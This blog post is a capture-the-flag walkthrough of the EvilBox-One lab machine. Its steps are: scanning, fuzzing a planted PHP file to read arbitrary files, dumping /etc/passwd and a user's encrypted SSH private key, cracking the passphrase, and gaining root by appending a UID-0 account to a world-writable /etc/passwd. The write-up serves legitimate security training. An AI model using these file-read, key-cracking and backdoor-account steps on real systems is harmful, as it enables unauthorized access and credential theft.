---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/evilbox-one,736/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

Lets start with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.76.212     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 13:43 EST
Nmap scan report for 192.168.76.212
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```

## dir busting
```bash
$ gobuster dir -u http://192.168.76.212/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.76.212/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/11/20 13:44:45 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 12]   
/robots.txt           (Status: 200) [Size: 12]   
/secret               (Status: 301) [Size: 317] [--> http://192.168.76.212/secret/]
                                                                                   
===============================================================
2022/11/20 13:46:44 Finished
===============================================================
```

## dir busting the resource `/secret/`
```bash
$ gobuster dir -u http://192.168.76.212/secret/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.76.212/secret/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/11/20 13:47:16 Starting gobuster in directory enumeration mode
===============================================================
/evil.php             (Status: 200) [Size: 0]
/index.html           (Status: 200) [Size: 4]
/index.html           (Status: 200) [Size: 4]
                                             
===============================================================
2022/11/20 13:49:13 Finished
===============================================================
```

## requesting `/secret/evil.php`
### request
```http
GET /secret/evil.php HTTP/1.1
Host: 192.168.76.212
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Sun, 20 Nov 2022 19:05:54 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

> The file does not deliver any content.
{: .prompt-danger }

However, as the file is named `evil.php` it indicates that it maybe some shell or other backdoor of a script kiddy who pwned the website.

> Unfortunately we do not know what parameter is needed here.
{: .prompt-danger }

---

# exploitation
## brute forcing a valid parameter for `evil.php`
As we have no idea if the file `evil.php` is used for command execution or file read, we need to check both.  
Checking for command injection does not reveal anything useful, so we will check for an arbitrary file read.  
  
We are using `burp suite intruder` to brute force a parameter used by `evil.php`.  
We use `sniper` and the wordlist `/usr/share/wordlists/dirb/common.txt`.  

![burp intruder](/images/evilboxone_intruder1.png)

![burp intruder result](/images/evilboxone_intruder2.png)

> Yes! it seems that `command` is a valid parameter which can be used to read files on the target system.
{: .prompt-info }

### request `/etc/passwd`
```http
GET /secret/evil.php?command=/etc/passwd HTTP/1.1
Host: 192.168.76.212
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response `/etc/passwd`
```http
HTTP/1.1 200 OK
Date: Sun, 20 Nov 2022 19:11:39 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 1398
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

We see that there are the following interesting users: `root`, `mowree`.

## leaking a `ssh` key

### `root` `ssh` key request
```http
GET /secret/evil.php?command=/root/.ssh/id_rsa HTTP/1.1
Host: 192.168.76.212
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### `root` `ssh` key response
```http
HTTP/1.1 200 OK
Date: Sun, 20 Nov 2022 19:13:16 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

> Requesting the private `ssh` key for `root` does not work.
{: .prompt-danger }

### `mowree` `ssh` key request
```http
GET /secret/evil.php?command=/home/mowree/.ssh/id_rsa HTTP/1.1
Host: 192.168.76.212
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### `mowree` `ssh` key response
```http
HTTP/1.1 200 OK
Date: Sun, 20 Nov 2022 19:13:23 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 1743
Connection: close
Content-Type: text/html; charset=UTF-8

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

> Yeah! We got the `ssh` private key of user `mowree`.
{: .prompt-info }

## login via `ssh`
```bash
$ nano id_rsa

$ chmod 600 id_rsa 

$ ssh -i id_rsa mowree@192.168.76.212
The authenticity of host '192.168.76.212 (192.168.76.212)' can't be established.
ED25519 key fingerprint is SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.76.212' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

> We need a passphrase to use the `ssh` key.
{: .prompt-danger }
  
Lets crack the keys passphrase.
```bash
$ ssh2john id_rsa > id_rsa.hash
$ john id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
unicorn          (id_rsa)     
1g 0:00:00:00 DONE 2/3 (2022-11-20 14:25) 11.11g/s 141488p/s 141488c/s 141488C/s surfer..unicorn
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> And we got the passphrase for the private key! (`unicorn`)
{: .prompt-info }

Now we can login via `ssh`.
```bash
$ ssh -i id_rsa mowree@192.168.76.212
Enter passphrase for key 'id_rsa': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ id
uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

> It worked!
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
mowree@EvilBoxOne:~$ ls
local.txt
mowree@EvilBoxOne:~$ cat local.txt 
1******************************6
```

## privilege escalation
```bash
mowree@EvilBoxOne:~$ ls -lsah /etc/passwd
4,0K -rw-rw-rw- 1 root root 1,4K ago 16  2021 /etc/passwd
```

> The file `/etc/passwd` is world writeable, so we can add a new user with `root` privileges.
{: .prompt-info }
  
First we create a password hash with the salt `new` and the password `123`.
```bash
$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

Now we add the following line to the end of the file `/etc/passwd`.
```bash
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

After this we can change to user `new` with password `123`.
```bash
mowree@EvilBoxOne:~$ su new
Contraseña: 
root@EvilBoxOne:/home/mowree# id
uid=0(root) gid=0(root) grupos=0(root)
```

> We are `root`!
{: .prompt-info }

## get second flag
```bash
root@EvilBoxOne:/home/mowree# cd /root/
root@EvilBoxOne:~# ls
proof.txt
root@EvilBoxOne:~# cat proof.txt 
1******************************5
```

Pwned! <@:-)
